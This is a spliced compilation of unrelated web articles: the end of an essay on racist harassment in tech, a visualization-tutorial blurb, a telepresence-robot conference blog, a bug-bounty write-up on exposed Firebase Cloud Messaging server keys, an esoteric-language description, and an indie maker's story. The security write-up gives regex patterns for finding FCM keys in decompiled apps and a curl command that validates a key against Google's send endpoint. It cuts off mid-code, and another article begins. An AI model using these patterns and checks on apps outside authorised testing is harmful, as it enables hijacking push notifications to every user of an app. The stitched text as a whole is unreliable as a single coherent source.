    </span></p><p>That wasn't every screenshot from the threads, but is a good summary. The sheer volume of comments was definitely one of the more overwhelming aspects of this fuckery. Thanks for reading along this far.</p><h2>So if it wasn't clear:</h2><p><undefined>I was targeted by racist techies because of my background and visibility in order to be silenced and driven out of this industry. <span role="img" aria-label="middle finger">🖕</span></undefined></p><p>It was particularly cruel to harass me on the platform I work on everyday, where I design for open source communities. I couldn't focus at work and ended up taking two weeks off. This experience has really impacted the way I view tech and my place in it—but I'll save that for another post. </p><p>I've already accepted that this won't be my last brush with online harassment, so long as I'm still a visible Asian woman in tech. And this is going to continue happening to me and less privileged tech workers for just existing and being successful. All we can do is protect and support each other, because it's not our job to fix this problem.</p><p>It's your move next, tech. Here are my suggestions, you can have them for free:  </p><h2>To the most privileged tech leaders:</h2><p>When these events happen to your employees, are you investing actual money to support them? Are you monitoring content, encouraging time off, creating company policies, and covering their therapy? In lucky cases like mine, where the bulk of harassment may happen on the platform the victim works on, are you actively fixing pain points your employee experienced? Make sure you have a policy and detailed playbook, and definitely don't expect your marginalized employees to fix these problems for you. Don't wait until an incident arises—<strong>it's always an "edge case" until someone's personal safety is threatened.</strong></p><p>By not having intentional protections for the most vulnerable in place, you're preventing employees from being productive at work (because they're dealing with bullshit!). And you're absolutely driving away diverse talent from joining your company. It's actually fucking up your business. Access and representation in tech isn't a pipeline or qualification problem. <strong>It's a white supremacy problem.</strong></p><blockquote><p>And what still really creeps me out is that these people felt so emboldened to troll an EMPLOYEE using their actual GitHub accounts with legitimate work and contributions. <u>These harassers are everyday software engineers.</u></p></blockquote><p>Lastly, I want to circle back to this point about users with legitimate coding work harassing me. It's easy to dismiss these trolls as incel 4channers that we shun and don't associate with. Lol no. These are your people. They work at your companies and write your code. They are harassing or doxxing your other employees. This toxic behavior is still very much a part of your tech culture, and you keep rewarding it.</p><p>Fix. This. Shit.</p></article></div>]]>

<p><strong>Hands-on tutorials for basic visualization techniques and the necessary data processing</strong></p>

<h2 id="About">About<a href="#About">¶</a></h2><p>Information visualization is concerned with the visual and interactive representation of abstract and possibly complex datasets. As we encounter growing datasets in various sectors there is an increasing need to develop effective methods for making sense of data. Information visualization relies on computational means and our perceptual system to help reveal otherwise invisible patterns and gain new insights. Across various fields, there is great hope in the power of visualization to turn complex data into informative, engaging, and maybe even attractive forms. However, it typically takes several steps of data preparation and processing before a given dataset can be meaningfully visualized. While visualizations can indeed provide novel and useful perspectives on data, they can also obscure or misrepresent certain aspects of a phenomenon. Thus it is essential to develop a critical literacy towards the rhetoric of information visualization. One of the best ways to develop this literacy is to learn how to create visualizations! The tutorials offer a practical approach to working with data and to create interactive visualizations.</p>

</div>
</div>
</div>
<div><div>
<p>The tutorials require basic familiarity with statistics and programming. They come as <a href="https://jupyter.org/">Jupyter notebooks</a> containing both human-readable explanations as well as computable code. The code blocks in the tutorials are written in <a href="https://www.python.org/">Python</a>, which you should either have already some experience with or a keen curiosity for. The tutorials make frequent use of the data analysis library <a href="https://pandas.pydata.org/">Pandas</a>, the visualization library <a href="https://altair-viz.github.io/">Altair</a>, and a range of other packages. You can view the tutorials as webpages, open  and run them on <a href="https://colab.research.google.com/">Google Colab</a>, or download the Jupyter notebook files to edit and run them locally.</p>
</div>

<h2 id="Credits">Credits<a href="#Credits">¶</a></h2><p>The tutorials were created for the Information Visualization course at Fachhochschule Potsdam during the summer semester 2020. Many thanks to Fidel Thomet, Jonas Parnow et al. at UCLAB for feedback and fixes, and to the many generous creators of the various open source software packages used throughout the tutorials.</p>

<p>We like experimenting with geeky tools. All in the name of science of course…</p>



<p>How about sitting on a beach in Thailand and participating in conference in Stockholm by remote-controlling an ipad on a stick on wheels? Sounds like a fun experiment, doesn’t it? How many geek points is that?</p>



<figure><img src="https://hkniberg.files.wordpress.com/2013/12/henriks-double2.jpg?w=390&amp;h=520" alt="Image" title="Ipad on a stick on wheels"></figure>



<p>And hey, I just happen to be on an island in Thailand right now, and there’s this cool event&nbsp;<a href="http://leantribe.org/ltg-18/">Lean Tribe Gathering</a>&nbsp;happening at the Spotify Stockholm office, and I recently bought a&nbsp;<a href="http://www.doublerobotics.com/">double</a>. I saw one of those things driving around the office a few months ago, and it instantly popped to the top of my must-try-someday list.</p>



<p>So what was the hypothesis? I’ve heard that it’s only an experiment if you have a hypothesis. Otherwise it’s just playing around, and I wouldn’t want to be accused of that would I?</p>



<p>The conference was an evening of lightning talks and open space (= big room with lots of mingling and small groups of informal conversations, like a cocktail party under the guise of a conference). Will I hear and see the presentations? Will I be able to roll around and freely participate in the open space? Will I feel like I’m&nbsp;<em>really</em>&nbsp;<em>there</em>?</p>



<p>So my hypothesis was: “I can fully participate in this conference using a double”.</p>



<p>So how did it work out?</p>



<figure><img src="https://i0.wp.com/hkniberg.wordpress.com/wp-includes/js/tinymce/plugins/wordpress/img/trans.gif" alt="" title="More..."></figure>



<p>It worked! The hypothesis was falsified, unfortunately, but it was still really cool! I sat on the beach near a restaurant with good connectivity, pulled out my ipad, logged on to my double in Stockholm, and started driving around and talking to people. Geek heaven!<img loading="lazy" src="https://hkniberg.files.wordpress.com/2013/12/on-the-beach2.jpg?w=650&amp;h=414" alt="Image" width="650" height="414">Alone on a dark beach because it got rather late. +6 hrs time difference.</p>



<p>I was totally impressed, but also slightly disappointed, at the same time. Impressed that I felt truly present at the conference, but slightly disappointed that I felt more like an observer &amp; comic relief than a real participant.</p>



<p><strong>Watching the lightning talks</strong></p>



<p>The controls were a bit clumsy, and my internet connection was a bit shaky. But I could get around fine, slowly, and I was able to make it to the front of the room right by the stage.</p>



<p>For the lightning talks I could see and hear the speakers fine (they had mics), and I could make out about half of the slides (depending on colors used, font size, etc). All in all I got the presenter’s message. But I didn’t need a double for that, someone could have put a laptop on a chair and connected me via skype/hangout. On the other hand, it was nice to be able to “turn my head” from time to time, to follow the speaker’s movements, or see the audience and the room.</p>



<p><strong>Mingling in the open space</strong></p>



<p>The open space part was really fascinating. Driving around this… thing…. and feeling like I’m really there. Weird.</p>



<p>However, although it was fun and cool, in practice it didn’t really work that well because of the background chatter. I could roll up to a group of people, but I could only pick out about 20% of what was being said, because of all the other discussion happening around me. Also, the ipad speakers are too weak for this kind of situation, people could only hear me speak if they bent down and put their head really close. So I felt more like an observer than a participant.</p>



<figure><a href="http://hkniberg.files.wordpress.com/2013/12/my-ipad.jpg"><img src="https://hkniberg.files.wordpress.com/2013/12/my-ipad.jpg?w=468&amp;h=611" alt="Image"></a></figure>



<p>At one point I joined a smaller group (4 people) sitting a bit further off, away from the main chatter.&nbsp; That worked perfectly, I could join the group and really be part of the conversation.</p>



<p><strong>REAL telepresence</strong></p>



<p>The cool thing is that I was really there. I mean that thing rolling around was ME! On one hand I was like “wow, awesome, I teleported to Stockholm and shapeshifted along the way!”. A true out-of-body experience. On the other I hand I was like “HELP! I’m stuck inside this thing! My body has become and ipad on a stick on wheels!”.</p>



<p>I had the distinct sensation of “Wow, so this is what it’s like being a drunk&nbsp;<a href="http://en.wikipedia.org/wiki/Tetraplegia">tetraplegic</a>&nbsp;with bad hearing and a weak voice.”</p>



<p>Tetraplegic, because I’m effectively paralyzed from the neck down – the double doesn’t even have legs or arms. I could see and hear, and I could roll around like in a wheelchair. But slowly and carefully, and I sometimes needed assistance when things got in the way. Sometimes I got assistance, even when I didn’t need it, which felt both good and bad at the same time. Gradually people noticed that I could get around quite nicely myself, with some patience. I can’t turn my head, but I can turn my whole vehicle from side to side to see what’s going on. Of course, I don’t know what it’s really like to be a tetraplegic but I guess it’s probably something like this.</p>



<p>Drunk, because that thing sways quite often to stay in balance, and sometimes bumps into things or trips on small objects and falls flat on it’s face (happened only once, but it felt horrible).</p>



<p>Bad hearing and weak voice, because of the background noise in combination with my rather limited microphone and speaker. I often couldn’t follow the conversation going on, and people had to lean in close to hear what I was saying.</p>



<p>Another interesting thing. Sometimes when I rolled up to a group of people, they stopped talking and stared at me instead. As if I was some kind of object (and maybe I was…. or maybe not? Any philosophers out there?). Lots of smiles and laughs of course, and the occasional shocked surprised as someone realized that “hey, there’s a person inside that thing!”. In some cases I felt more like a comic relief than a true conference participant. While listening in on a conversation (well, trying…) I sometimes noticed people staring at me, and they couldn’t see that I was staring right back at them. A weird feeling of eye contact and, well, not.</p>



<p>Although, I admit, it was quite fun to sometimes bump into people and see them shriek in surprise at being accosted by an ipad on a stick on wheels, with a grinning guy on the screen. Even earned me a kiss on the cheek once. Or at least that’s what I&nbsp;<em>think</em>&nbsp;she was doing. It wasn’t a slap at least, I don’t think.</p>



<p>I asked one guy for some coffee, and he almost did, until he realized what he was talking to :o)</p>



<p><strong>Running out of batteries</strong></p>



<p>Unfortunately the ipad on the double wasn’t fully charged from start, so it started running low quite quickly. I didn’t want to disrupt the ongoing presentation, so I tweeted for help, and someone kindly plugged me in.</p>



<figure><a href="http://hkniberg.files.wordpress.com/2013/12/need-batteries.jpg"><img src="https://hkniberg.files.wordpress.com/2013/12/need-batteries.jpg?w=562&amp;h=499" alt="Image"></a></figure>



<p>During a break, I logged off to make it charge faster (which it didn’t). Then later, when logging in again, I found myself standing a few meters away from the nearest person. I wanted to be unplugged so I could move around! Heeeeelp! but nobody could hear me! Now what? I guess I could tweet again, but it might take a while for someone to react.</p>



<p>Ah, I could display a message on my screen! But how? The app on my end will only send the video stream, i.e. my face on the camera. I can’t get it to display something else. Ah, I could write a note! But darn, I’m sitting on a beach in Thailand and no paper or pen nearby.</p>



<p>Then I realized that I had my laptop with me (as backup solution). So I fired up textedit and wrote a message</p>



<figure><a href="http://hkniberg.files.wordpress.com/2013/12/unplug-me.png"><img src="https://hkniberg.files.wordpress.com/2013/12/unplug-me.png?w=256&amp;h=224" alt="Image"></a></figure>



<p>I made the font huge (as in covering the whole screen), and pointed my ipad cam at it. And moved it back and forth a bit for effect (causing the text to pulsate). That worked! People at the conference saw the message quickly and unplugged me.</p>



<p>The charger didn’t work though, so I was still at about 10%. I figured I’d just participate as long as I could, and the battery would die when it died. That was also a weird feeling, knowing that at any moment I will “die”, my double will go limp, and I’ll suddenly wake up back on the beach in Thailand. Total Matrix moment! I saw the battery counter go lower and lower, and my minutes were numbered, so I had to make the most of it. Carpe Minutus! Seize the minute!</p>



<p><strong>Conclusions</strong></p>



<ul><li>Double is a supercool and practical gadget, looks nice and takes very little space.</li><li>Watching a presentation works</li><li>Having conversations in small groups works, but not if there’s other conversations happening nearby.</li><li>Moving around works, but slowly, and not with big thresholds or stairs.</li></ul>



<p>Features I would love to have:</p>



<ul><li>the ability to “tilt my head” upwards a bit. I could look down at my wheel via a nifty fold-down mirror (great for navigating around chairs and such), but I couldn’t look up, and the robot is rather short even when fully extended, so often I found myself involuntarily staring at someone’s chest as they talked to me. A bit awkward, especially with girls….)</li><li>the ability to display a message or sketch, not just my videocam &amp; face all the time.</li><li>the ability to plug myself in for charging, like the docking pads that lawnmower robots use.</li><li>a louder speaker, for noisy environments</li><li>a directional mic that can be activated/deactivated, in cases where I want to hear the person in front of me and ignore the background noise.</li></ul>



<p>Oh, and If you’re going to sit on a beach in Thailand in the middle of the night, make sure you have mosquito repellant. And don’t forget the hands! I have like 30 mosquito bites on my hands, I’ll probably get dengue fever or something. But heck, sometimes you have to make sacrifices for science!</p>

<h2 id="tldr">TL;DR</h2>
<p>A malicous attacker could control the content of push notifications to any application that runs the FCM SDK and has it’s FCM server key exposed &amp; at the same time send these notifications to every single user of the vulnerable application!</p>
<p>These notifications could contain anything the attacker wants including graphic/disturbing images(via the <code>"image": "url-to-image"</code> attribute) accompanied with any demeaning or politically inclined message in the notification!</p>

<p>The beginning of this year has seen a lot of <a href="https://twitter.com/search?q=%23androidhackingmonth&amp;src=typed_query">#AndroidHackingMonth</a> tweets popup which led to some pretty good disclosures showing different techniques and tricks with respect to android application hacking. I was intrigued and decided to fiddle a little with android hacking.</p>

<h2 id="gathering-a-dataset-of-decompiled-apks">Gathering a dataset of Decompiled APKs</h2>
<p>After rammaging through a dozen blogs on how to begin with hacking android applications and reading them to the best of my abilities, I decided to initially start with looking for secrets in an android application.</p>
<p>This meant decompiling an android apk and just grepping for some know patterns within the <code>strings.xml</code> file as that’s usually where secrets can be found and also the decompiled <code>.smali</code> files for “secret declaration” within the code i.e mediocre static code analysis. Sounds like a good first step!</p>
<p>I started downloading apks of some public and private programs from <a href="https://hackerone.com/">Hackerone</a> and <a href="https://bugcrowd.com/">Bugcrowd</a> so as to collect an initial dataset and then go in looking for secrets all together.</p>
<p>I was able to achieve this by the help of <a href="https://github.com/defparam/h1passets">h1passets</a>. I also sent in a mediocre <a href="https://github.com/defparam/h1passets/pull/2">PR</a> to collect all the package ids of the apks of Hackerone’s private programs. I then scraped a few package ids of public programs of HackerOne and Bugcrowd from <a href="https://github.com/arkadiyt/bounty-targets-data">bounty-targets-data</a>.</p>
<p>Once the package ids were collected, I took some time out to download them from <a href="https://apkcombo.com/">apkcombo</a>. After having close to 50-70 apks downloaded into a single folder, I began mass decompiling these apks using <a href="https://bitbucket.org/iBotPeaches/apktool/downloads/">apktool.jar</a>.</p>
<p>I did this with a simple bash script shown below</p>
<div><pre><code data-lang="bash"><span>#!/bin/bash
</span><span></span>
<span>for</span> file in *.apk
<span>do</span>
java -jar ~/APK_Research/apktool.jar d <span>$file</span> -o decompiled_apks/<span>$file</span>/
<span>done</span>
</code></pre></div><p>So now I had a credible sized dataset of decompiled apks to work with!</p>
<hr>
<h2 id="variable-names-have-it-all">Variable names have it all</h2>
<p>After hooking up <a href="https://github.com/tomnomnom/gf">gf</a> (A wrapper around grep) with a modified version of regex patterns from <a href="https://github.com/xyele/zile">Zile</a> (i remeber this was named something else initially), I began a simple gf grep through the decompiled apks directory to see if I could spot some secrets right away and report them.</p>
<p>I used my vps to run overnight gf greps from the Decompiled_apks folder and saved those results in separate files for further analysis. These saved files contain the API key/secret, their location and also their variable name.</p>
<p>Come the next day, I looked up most of the files and found pretty much nothing, just a bunch of SDK keys which were meant to be public, API keys with limited scope etc.</p>
<p>It was time to look into the <code>gcp_keys.txt</code> that contained the google cloud project (GCP) API keys. I knew they would usually contain API keys for Google Maps Or Google Crash Reporting API which had no impact.</p>
<p>But it was common knowledge that GCP keys could be multi-privileged i.e  the same key could be utilized for different enabled API’s!</p>
<p>So I began looking into the <code>gcp_keys.txt</code> file but with more focus on the variable names. Variable names can sometimes provide a lot of information about the privilege of the key. Here’s a rough snippet of the variable names I encountered inside the <code>gcp_keys.txt</code>:</p>
<div><pre><code data-lang="xml">apk-1/AndroidManifest.xml: <span>&lt;meta-data</span> android:name=<span>"server_key"</span> android:value=<span>"AIzaSyB[REDACTED]"</span><span>/&gt;</span>
apk-3/trx.smali:    const-string v1, "AIzaSyQ[REDACTED]"
apk-5/AndroidManifest.xml: <span>&lt;meta-data</span> android:name=<span>"com.google.android.geo.API_KEY"</span> android:value=<span>"AIzaSy[REDACTED]"</span><span>/&gt;</span>
apk-8/res/values/strings.xml: <span>&lt;string</span> name=<span>"google_maps_geocoder_key"</span><span>&gt;</span>AIzaSyl[REDACTED]<span>&lt;/string&gt;</span>
apk-2/res/values/strings.xml: <span>&lt;string</span> name=<span>"notification_server_key"</span><span>&gt;</span>AIzaSyl[REDACTED]<span>&lt;/string&gt;</span>
apk-4/AndroidManifest.xml: <span>&lt;meta-data</span> android:name=<span>"com.google.android.maps.v2.API_KEY"</span> android:value=<span>"AIzaSy[REDACTED]"</span><span>/&gt;</span>
</code></pre></div><p>So from the file, I was able to extract the below list of <em>as I call it</em> potential variable names.</p>
<p>google_maps_geocoder_key, notification_server_key, google_notification_key, app_api_key, googlePlacesWebApi, server_key … etc</p>
<p>I felt these keys were capable of something more! I started looking for articles/blogs containing similar variable names in order to conclude what exactly the key does.</p>
<p>Both <code>server_key</code> and <code>notification_server_key</code> led me to <a href="https://firebase.google.com/docs/cloud-messaging/server">Firebase Cloud Messaging / FCM</a></p>
<hr>
<h2 id="the-fcm-server-key---reading-docs-and-validation-of-the-key">The FCM Server Key - Reading docs and validation of the key</h2>
<p>After visiting <a href="https://firebase.google.com/docs/cloud-messaging/server">Firebase Cloud Messaging / FCM</a> ,i understood that the keys grepped could somehow be linked to cloud messaging aka push notification services. I was yet to find an article that explained everything, so I started digging again.</p>
<p>From the docs I got a gyst of a few things.</p>
<ul>
<li>There’s a server environment which deals with <strong>Send Requests</strong> i.e authorized requests that enforce push notifications</li>
<li>There’s a client FCM SDK that takes care of generating IID tokens that identifies an app instance on a device uniquely.</li>
</ul>
<p>Possibilities with the keys at hand? I either could have a key that has some role in the server environment or a client-end SDK key which was already meant to be public.</p>
<p>I focused on the server environment and came across the <a href="https://firebase.google.com/docs/cloud-messaging/migrate-v1">Legacy to HTTP v1 server protocol migration guide</a> . This article recommended migrating from a <a href="https://firebase.google.com/docs/cloud-messaging/http-server-ref">Legacy HTTP protocol</a> to the modern HTTP v1.</p>
<p>But as you see, It also shows how the <code>AizaSy</code> keys can be used as authorization keys under the <a href="https://firebase.google.com/docs/cloud-messaging/migrate-v1#update-authorization-of-send-requests">before section</a>, the same is shown in the image below</p>
<p><img src="https://abss.me/posts/fcm-takeover/aizasy.png" alt="FCM Authorization done via AizasY" title="FCM Authorization"></p>
<p>From this,  I figured the <code>AizaSy</code> keys are used for authorization of <strong>Send Requests</strong> via the Legacy HTTP protocol. This meant sending push notifications of my choice via the legacy HTTP protocol.</p>
<p>We cannot use the modern HTTP v1 protocol as it is based on the oauth2.0  security model. This makes use of bearer tokens of service accounts.</p>
<p>So reading the docs <a href="https://firebase.google.com/docs/cloud-messaging/auth-server#authorize-http-requests">here</a> under the legacy http protocol, I found a simple <code>curl</code> to validate the key.</p>
<div><pre><code data-lang="bash"><span>api_key</span><span>=</span>YOUR_SERVER_KEY

curl --header <span>"Authorization: key=</span><span>$api_key</span><span>"</span> <span>\
</span><span></span>     --header Content-Type:<span>"application/json"</span> <span>\
</span><span></span>     https://fcm.googleapis.com/fcm/send <span>\
</span><span></span>     -d <span>"{\"registration_ids\":[\"ABC\"]}"</span>
</code></pre></div><p>If the above curl returns a <code>200 OK</code> response status code then the key is legit. Anything other than <code>200 OK</code> and the key is invalid. Testing this on one of the suspected keys showed a <code>200 OK</code> response status code!</p>
<p>I knew how to validate the key and also the purpose of the key.</p>
<p>To sum things up, here is an overview of the FCM Architecture</p>
<p><img src="https://abss.me/posts/fcm-takeover/fcm-workings.png" alt="FCM Architecture"></p>
<hr>
<h2 id="discovering-key-variations">Discovering Key Variations</h2>
<p>As I was reading the forementioned <a href="https://firebase.google.com/docs/cloud-messaging/auth-server#authorize-http-requests">article</a> on authorizing legacy HTTP requests, I followed the first instruction that said to visit the <a href="https://console.firebase.google.com/project/_/settings/cloudmessaging/">Cloud Messaging tab</a> of the firebase project in order to locate the FCM server key <code>AizaSy</code> and there I found another variation of the key!</p>
<p>The image below shows both variations of a FCM server key.</p>
<p><img src="https://abss.me/posts/fcm-takeover/fcm_keys.png" alt="FCM Keys" title="FCM Authorization"></p>
<p>The FCM server key of regEx <code>AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}</code> is similar to the Legacy Server key i.e both are project credentials having authority over sending authorized send requests to all FCM SDK enabled applications under the firebase project. This key type is recommended to be used as per the docs.</p>
<p>Later on, my search for various blogs regarding the GCM( Google Cloud Messaging ) to FCM migration I noticed there is also the possibility of a gcp key to exist with formerly gcm permissions as seen <a href="https://www.izooto.com/blog/generate-gcm-sender-id-server-api-key">here</a>.</p>
<p>GCM has been long deprecated but due to migration and to stop any regressions, such keys were still valid for the new FCM endpoints! This is the final variation of the FCM server key.</p>
<p>So we have 3 types of FCM server keys :</p>
<ul>
<li>A FCM server key of regEx <code>AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}</code></li>
<li>A Legacy FCM server Key of regEx <code>AIzaSy[0-9A-Za-z_-]{33}</code>. This gets automatically added to your GCP project.</li>
<li>A GCP key with FCM privileges of the same regEx as above <code>AIzaSy[0-9A-Za-z_-]{33}</code>. In This variation, the key is createdunder a GCP project and then provided the essential privileges.</li>
</ul>
<p>As of now the Legacy Server Key has been deprectaed, so any forthcoming firebase project will not contain Legacy Server Keys anymore :</p>
<p><img src="https://abss.me/posts/fcm-takeover/deprecated_legacy_server-key.png" alt="Deprecated Legacy Server Key" title="FCM Authorization"></p>
<p>But if found, they are still valid! (again to prevent any backlogs and regressions!)</p>
<p>I quickly added the new regEx <code>AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}</code> to my gf profile and began another round of grep through the decompiled apk dataset and validated them!</p>
<p>Below is the combined gf profile for all key variations</p>
<div><pre><code data-lang="json">{
    <span>"flags"</span>: <span>"-oEarHn"</span>,
    <span>"patterns"</span>: [

     <span>"AIzaSy[0-9A-Za-z_-]{33}"</span>,
     <span>"AAAA[a-zA-Z0-9_-]{7}:[a-zA-Z0-9_-]{140}"</span>
 ]

        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>Computer Programming can be hard , can be complex to understand for some people, but that doesn’t mean that they can’t be fun. From the beginning , programming languages were in English , well most of them except some special languages. But I have designed a programming language which let’s people program in Cats’ language, Mew Mew Mew. Which despite being a esoteric language is very much usable , and let’s programmers create complex program. I
also have conducted a small study to find real world use cases of MewMew programming language.</p>



<p>Programming in Cats’ language , it is lunacy or what? But it’s reality. With MewMew one can program in cats’ language, but it is not actually the cats’ language but the human interpretation of cats’ language , mew mew mew.
MewMew is an esoteric programming language built with ANTLR4 and C++. It is not intended to be used for commercial or mainstream programming instead , it was designed to be learning project for me or any other novice language designer who want get started building their own programming language.
While majority of programming languages are in English or I should say human languages but this language intends to be one of the first language to be in ‘non-human’ (not technically) language.</p>



<p>MewMew is implemented using ANTLR4 and C++. Though using Dynamically typed host language would be given me more flexibilty designing the language, I chose to use a statically typed for a multiple reasons , First it is fast. Second , the language becomes much more runtime safe. When experimenting with early prototypes , I tried Python and PLY (Python Lex and Yacc) , Tatsu and even Flex &amp; Bison. Python and PLY was not chosen because it was too much slow , even Cythonzing didn’t give advantage. Tatsu was kind of better than PLY but again speed issue, and Flex &amp; Bison , I didn’t chose them because of their over complexity , a language small as MewMew required a huge codebase. Finally I setteled for ANTLR4 , It was comparativaly fast thanks to its ALL(*) algorithm , on top of that the API of it was very easy to catch on but also very robust.
When Designing MewMew , I left some places which can be used to improve or extend the language in future.</p>

<p>MewMew doesn’t use any traditional numbers (0 to 9) instead it uses ‘mew’s. For example , ‘mew’ will get converted to 1 , ‘mewmew’ will get converted to 2  , ‘mewmewmewmewmewmewmewmewmewmew’ will get converted to 10 and so on so forth but zero has special case , to get only zero one can use ‘mew-mew’.
MewMew also has few operator similar to C++, which are discussed in GitHub project repository README. MewMew is all about numbers, it doesn’t contain any other types such as strings , chars , arrays etc , which keeps the language lightweight. Every number in mewmew is a floating point number.
MewMew also has if , if else and a repeat loop aka. Meow loop expression. It also has a special type of function called scratch function which open the door of extending the language in future. Syntax of if statement is something like Expression ? Statements ; where ‘Expression’ takes any type of expression , on Truthy value the ‘Statements’ will get executed. Similar to that Expression ? Statements1 : Statements2 ; is the syntax of if-else statement, if the value of ‘Expression’ is truthy the ‘Statements1’ will get executed else ‘Statement2’ will get executed. The syntax of meow loop is something like this @ Expression : Statements; the ‘Statements’ will get executed N times where N = Expression. Scratch function syntax is something like #(Expression) where ‘#’ can be repeated from 1 to many times. But as of 5 functions are defined only.</p>

<p>Here’s a comparison of some simple program written in MewMew and C++ :</p>

<table>
  <thead>
    <tr>
      <th>In MewMew</th>
      <th>In C++</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>m=mew;<br>@#####(mew):<br>m % mewmew == mew – mew ?<br>::m;<br>;<br>m = m + mew;<br>;<br></td>
      <td>#include <iostream><br>using namespace std;<p>int main()<br>{<br>for(int m = 1; m &lt;= 100 ; ++m){<br>if (m%2 == 0){<br>cout &lt;&lt; m &lt;&lt; endl;<br>}<br>}<br>}</p></iostream></td>
    </tr>
    <tr>
      <td>m=mew;<br>@####(mew):<br>m % mewmewmew == mew – mew &amp; m % ###(mew) == mew – mew ? <br>::m;<br>;<br>m = m + mew;<br>;<br></td>
      <td>#include <iostream><br>using namespace std;<p>int main()<br>{<br>for(int m = 1; m &lt;= 100 ; ++m){<br>if (m%3 == 0 &amp;&amp; m%5==0){<br>cout &lt;&lt; m &lt;&lt; endl;<br>}<br>}<br>}</p></iostream></td>
    </tr>
  </tbody>
</table>



<p>MewMew is an esoteric language which is morelike a joke than a commercial language. It was created to be a leaning project for which it has done successfully. In future it also might work as an reference to learning language designing for future.With the scratch function it opens new doors forexpanding the language in future. It will only took a few lines of code in switch…case statement to add a new function.</p>

<p><span>In every industry but tech, there’s hundreds of competitors within each vertical.</span></p>
<p><span>By building something that already exists, it curtails the initial validation period for a product.</span></p>
<p><span>As a maker, it’s taken me over two years to truly understand this concept.</span></p>
<p><span>After listening to every Indie Hackers podcast, this was a common theme I’d recognised between the most successful products.</span></p>
<p><span>Whether it be Less Annoying CRM, Transistor.FM, or The Hustle, these products entered a pre-conceived vertical with existing customer demand.</span></p>
<p><span>Until now, it feels like I’ve spent my early 20’s in the pursuit of product/market fit.</span></p>
<p><span>What I never understood, was that it already existed across thousands of markets.</span></p>
<p><span>With a background working in tech startups, I’ve always valued innovation above anything else.</span></p>
<p><span>After spending two full years failing to gain any product traction, I realised this was my greatest weakness as a maker.</span></p>
<p><span>After two years of building products, I’d generated $0 in revenue.</span></p>
<p><span>In August 2020, I generated my first $66 (AUD) from a product in less than 24 hours.</span></p>
<p><span>How did I do it?</span></p>
<p><span>By prioritising validation instead of innovation.</span></p>
<p><span>Although it’s not much, this $66 was a gargantuan milestone in my maker journey.</span></p>

<p><span>Let me quickly backtrack and give you a brief history of my experiences leading to this point.</span></p>
<p><span>If you’re an early-stage maker struggling to generate revenue, this post will share some actionable insights to help streamline your own product journey.</span></p>


<hr>


<p><span><b>June 2018</b></span></p>
<p><span>In 2018, I had my first surreal moment to becoming a maker. It was my first idea for a product.</span></p>
<p><span>I wanted to build the </span><a href="https://dribbble.com/" target="_blank" rel="noopener"><span>Dribbble</span></a><span> for digital marketers.</span></p>
<p><span>As a digital marketer myself, I planned to create a platform where I could showcase a portfolio of my real work.&nbsp;</span></p>
<p><span>My vision was to build the worlds leading community hub for digital marketers, streamlining the way they showcase work and source job opportunities.</span></p>
<p><span>As a non-technical maker, I started building with the tools I had.&nbsp;</span></p>
<p><span>Before creating a product, I spent a year of my life trying to build an existing community as a Facebook group.</span></p>
<p><span>At its peak, I’d grown this community to roughly 300 members, although I’m sure only a fraction of these were active users.</span></p>
<p><span>Looking back, I’m thankful that I tried to build a community before creating a product, although, to be fair, I didn’t have any other option – I didn’t know how to code.</span></p>


<hr>


<p><span><b>June 2019</b></span></p>
<p><span>A year later, I stumbled across the no-code landscape.&nbsp;</span></p>
<p><span>This changed everything.</span></p>
<p><span>I could finally build my grand vision for a platform.</span></p>
<p><span>This was where I started spiralling down a path of first-time maker mistakes.</span></p>
<p><span>Did I even bother to ask my community if this was a platform they wanted?</span></p>
<p><span>No.</span></p>
<p><span>Did I validate the idea?</span></p>
<p><span>Certainly not.</span></p>
<p><span>Was this a product that could even generate revenue from day one?</span></p>
<p><span>Not a chance.</span></p>
<p><span>So when November of 2019 came around, I was so confused when my platform hadn’t gained any real traction.</span></p>
<p><span>I’d spent four straight months building this product, then an additional two months trying to gain user adoption.</span></p>
<p><span>I completely burnt myself out trying to maintain something that never had a chance.</span></p>
<p><span>So what did I decide to do?</span></p>
<p><span>Tear it down and start again.</span></p>


<hr>


<p><span><b>January 2020</b></span></p>
<p><span>It’s a new year and I’d had the opportunity to learn first-hand from my past mistakes.</span></p>
<p><span>At this point, I’m 18 months into making and I hadn’t generated a single dollar in revenue.</span></p>
<p><span>This time around, I had clear expectations and guidelines to follow.</span></p>
<ol>
<li><span>I had to sell to businesses</span></li>
<li><span>I wasn’t allowed to build a product until I’d confidently validated an idea</span></li>
</ol>
<p><span>At this point, I was freelancing as a digital marketer, so I was still eager to build a product within this industry.</span></p>
<p><span>After hearing </span><a href="https://www.indiehackers.com/forum/how-to-build-a-life-you-love-by-quitting-everything-else-with-lynne-tye-of-key-values-706009faea" target="_blank" rel="noopener"><span>Lynne Tye’s episode</span></a><span> of the Indie Hackers podcast, I knew exactly what I needed to build.</span></p>
<p><span>I was going to build the </span><a href="https://www.keyvalues.com/" target="_blank" rel="noopener"><span>Key Values</span></a><span> for digital marketers. It’d be a place where passionate digital marketers could source opportunities with teams that shared their values.</span></p>
<p><span>One of the core reasons why I’m a freelancer is because I’d never found a company to work for that shared my own personal values.</span></p>
<p><span>I was absolutely blown away when I first heard Lynne’s story.</span></p>
<p><span>Her product wasn’t anything technically advanced, and her background wasn’t in marketing. So how was it that Lynne was able to gain as much traction as she did?</span></p>
<p><span>She solved a real problem for businesses and spent a long time validating her idea.</span></p>
<p><span>I was eager to get started, but I encountered my first problem.</span></p>
<p><span>I live in Brisbane, Australia. In my city, I’ve never met a startup big enough to need a dedicated marketing team.</span></p>
<p><span>What was my alternative?</span></p>
<p><span>I knew I had to get myself over to SF – the heart of the startup landscape.&nbsp;</span></p>
<p><span>From an outsiders perspective, there was an endless sea of opportunity there.</span></p>
<p><span>I booked my flights for May, then start cold emailing as many marketing recruiters as possible.</span></p>
<p><span>I shared the concept of my product and asked if they’d be interested in joining pre-launch.</span></p>
<p><span>Within a few weeks, I’d been on calls with recruiters from Intercom, Pinterest, Harry’s, and Tray.io.</span></p>
<p><span>My plan was to get these brands on board before launch – making the product more valuable when I release it to the public.</span></p>
<p><span>I didn’t expect to charge these initial brands. I was simply looking for validation.</span></p>
<p><span>On March 13th, I had a call with a recruiter from a startup that had recently raised a $50 million round.</span></p>
